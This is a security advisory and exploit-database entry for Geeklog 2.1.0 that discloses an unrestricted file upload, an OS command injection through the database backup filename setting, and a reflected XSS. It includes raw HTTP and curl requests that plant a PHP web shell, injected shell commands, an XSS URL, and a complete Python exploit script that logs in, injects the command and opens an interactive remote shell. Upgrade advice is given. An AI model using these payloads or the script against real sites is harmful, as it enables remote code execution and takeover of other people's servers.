@@ -1,0 +1,237 @@
+id: 24697
+date: 12/10/2015
+title: Geeklog 2.1.0 - Multiple Vulnerabilities
+author: Tim Coen
+cves: 
+
+Geeklog 2.1.0 - Command Injection, XSS, Command Injection Vulnerabilities
+
+  Overview
+
+The admin area of Geeklog suffers from two vulnerabilities that can lead to
+code execution: OS Command Injection and Upload of Files with Dangerous Type.
+
+The arbitrary file upload is already fixed in the beta version geeklog-2.1.1b1,
+the OS command injection in version 2.1.1b3.
+
+  Upload of Files with Dangerous Type
+
+CVSS
+
+High 9.0 AV:N/AC:L/Au:S/C:C/I:C/A:C
+
+Description
+
+When uploading a file, the file type check is performed only client-side. An
+attacker can easily bypass this check and thus upload files of dangerous types,
+such as PHP files.
+
+To upload files, an attacker needs a registered user that is in the group
+"Filemanager Admin".
+
+Proof of Concept
+
+
+POST /geeklog-2.1.0/public_html/filemanager/connectors/php/filemanager.php HTTP/1.1
+Host: localhost
+X-Requested-With: XMLHttpRequest
+Content-Length: 761
+Content-Type: multipart/form-data; boundary=---------------------------10717364298700964751730232773
+Cookie: [cookies]
+
+-----------------------------10717364298700964751730232773
+Content-Disposition: form-data; name="mode"
+
+add
+-----------------------------10717364298700964751730232773
+Content-Disposition: form-data; name="currentpath"
+
+/var/www/geeklog-2.1.0/public_html/images/
+-----------------------------10717364298700964751730232773
+Content-Disposition: form-data; name="filepath"
+
+test.png
+-----------------------------10717364298700964751730232773
+Content-Disposition: form-data; name="newfile"; filename="shell.php"
+Content-Type: image/png
+
+<?php passthru($_GET['x'])
+-----------------------------10717364298700964751730232773
+Content-Disposition: form-data; name="upload"
+
+Upload
+-----------------------------10717364298700964751730232773--
+
+As curl command:
+
+
+curl -i -s -k  -X 'POST' \
+-H 'Content-Type: multipart/form-data; boundary=---------------------------10717364298700964751730232773' \
+-b 'gl_session=838973868; geeklog=2; password=18bdbd240593b81a5239285a1f56283b4ae20648;' \
+--data-binary $'-----------------------------10717364298700964751730232773\x0d\x0aContent-Disposition: form-data; name=\"mode\"\x0d\x0a\x0d\x0aadd\x0d\x0a-----------------------------10717364298700964751730232773\x0d\x0aContent-Disposition: form-data; name=\"currentpath\"\x0d\x0a\x0d\x0a/var/www/geeklog-2.1.0/public_html/images/\x0d\x0a-----------------------------10717364298700964751730232773\x0d\x0aContent-Disposition: form-data; name=\"filepath\"\x0d\x0a\x0d\x0atest.png\x0d\x0a-----------------------------10717364298700964751730232773\x0d\x0aContent-Disposition: form-data; name=\"newfile\"; filename=\"shell.php\"\x0d\x0aContent-Type: image/png\x0d\x0a\x0d\x0a<?php passthru($_GET[\'x\'])\x0d\x0a-----------------------------10717364298700964751730232773\x0d\x0aContent-Disposition: form-data; name=\"upload\"\x0d\x0a\x0d\x0aUpload\x0d\x0a-----------------------------10717364298700964751730232773--\x0d\x0a' \
+'http://localhost/geeklog-2.1.0/public_html/filemanager/connectors/php/filemanager.php'
+
+  OS Command Injection
+
+CVSS
+
+High 9.0 AV:N/AC:L/Au:S/C:C/I:C/A:C
+
+Description
+
+When performing a database backup, various settings are passed unsanitized to
+exec, leading to code execution.
+
+To exploit this issue, an attacker needs a registered user that is in the group
+"Root".
+
+Proof of Concept
+
+
+1. Change "Backup File Name Mask" in http://localhost/geeklog-2.1.0/public_html/admin/configuration.php?tab-5 to:
+    geeklog_db_backup_%Y_%m_%d_%H_%M_%S.sql";echo "<?php passthru(\$_GET['x']);" > shell.php;"
+2. Perform database backup here:
+    http://localhost/geeklog-2.1.0/public_html/admin/database.php
+    The injected commands will be executed.
+
+In the beta version geeklog-2.1.1b1, less-than is filtered out, but OS command
+injection is still possible, including the creation of a PHP shell by appending
+the injected PHP code to an existing PHP file without closing tags:
+
+
+    geeklog_db_backup_%Y_%m_%d_%H_%M_%S.sql";echo "passthru(\$_GET['x']);" >> ../filemanager/connectors/php/inc/wideimage/lib/Font/PS.php;"
+
+Code
+
+
+/admin/database.php
+function dobackup()
+{
+[...]
+if (!empty($_CONF['mysqldump_filename_mask'])) {
+    $filename_mask = strftime($_CONF['mysqldump_filename_mask']);
+}
+[...]
+$backupfile = $_CONF['backup_path'] . $filename_mask;
+[...]
+$command .= " $_DB_name > \"$backupfile\"";
+[...]
+if ($canExec) {
+    exec($command);
+
+5. Solution
+
+To mitigate this issue please upgrade at least to version 2.1.1b3:
+
+https://www.geeklog.net/filemgmt/visit.php/1156
+
+Please note that a newer version might already be available.
+
+
+--------------------------------------------------
+
+Geeklog 2.1.0 Cross Site Scripting
+
+Description
+
+There is at least one XSS vulnerability in the installation script of Geeklog.
+
+Geeklog recommends to delete the install directory and displays warnings in the
+admin area if this is not the case. However, deleting the install directory is
+not mandatory, so it should be assumed that not all users will delete it.
+
+  Proof of Concept
+
+
+http://localhost/geeklog-2.1.0/public_html/admin/install/bigdump.php?foffset=1&start=1&fn=te<script>alert(1)</script>st.sql
+
+$_REQUEST['site_url'], $_REQUEST['site_admin_url'], and $_SERVER['PHP_SELF']
+may be vulnerable as well, but the attacker would need a valid sql backup file
+to trigger them.
+
+  Solution
+
+To mitigate this issue please upgrade at least to version 2.1.1b3:
+
+https://www.geeklog.net/filemgmt/visit.php/1156
+
+Please note that a newer version might already be available.
+
+--------------------------------------------------------
+
+Geeklog 2.1.0 Command Injection Exploit
+
+#!/usr/local/bin/python
+# Exploit for geeklog-2.1.0 OS Command Injection vulnerability
+# An admin account is required to use this exploit
+# Curesec GmbH
+
+import sys
+import re
+import argparse
+import requests # requires requests lib
+
+parser = argparse.ArgumentParser()
+parser.add_argument("url", help="base url to vulnerable site")
+parser.add_argument("username", help="admin username")
+parser.add_argument("password", help="admin password")
+args = parser.parse_args()
+
+url = args.url
+username = args.username
+password = args.password
+
+loginPath = "/admin/moderation.php"
+configPath = "/admin/configuration.php?tab-5"
+backupPath = "/admin/database.php"
+
+shellFileName = "404.php"
+shellContent = "<?php passthru(\$_GET['x']);"
+
+def login(requestSession, url, username, password):
+    postData = {"mode": "login", "warn": "1", "loginname": username, "passwd": password}
+    loginResult = requestSession.post(url, data = postData).text
+    return "Incorrect Login Information" not in loginResult and "You have exceeded the number of allowed login attempts" not in loginResult
+
+def getCSRFToken(requestSession, url):
+    csrfRequest = requestSession.get(url)
+    csrfTokenRegEx = re.search('name="_glsectoken" value="(.*)" />', csrfRequest.text)
+    return csrfTokenRegEx.group(1)
+
+def injectCommand(requestSession, url):
+    csrfToken = getCSRFToken(requestSession, url)
+    postData = {"_glsectoken": csrfToken, "conf_group": "Core", "sub_group": "0", "form_submit": "true", "mysqldump_filename_mask": 'geeklog_db_backup_%Y_%m_%d_%H_%M_%S.sql";echo "' + shellContent + '" > ' + shellFileName + ';"'}
+    requestSession.post(url, data = postData)
+
+def executeCommand(requestSession, url):
+    csrfToken = getCSRFToken(requestSession, url)
+
+    requestSession.get(url + "?mode=backup&_glsectoken=" + csrfToken)
+
+def runShell(url):
+    print("enter command, or enter exit to quit.")
+    command = raw_input("$ ")
+    while "exit" not in command:
+        print(requests.get(url + command).text)
+        command = raw_input("$ ")
+
+requestSession = requests.session()
+
+if login(requestSession, url + loginPath, username, password):
+    print("successful: login")
+else:
+    exit("ERROR: could not log in")
+
+print("injecting command")
+injectCommand(requestSession, url + configPath)
+
+print("executing command")
+executeCommand(requestSession, url + backupPath)
+
+runShell(url + "/admin/" + shellFileName + "?x=")
+
+
+Blog Reference:
+https://blog.curesec.com/article/blog/Geeklog-210-Code-Execution-Exploit-120.html
+
+#  0day.today [2023-03-26]  #
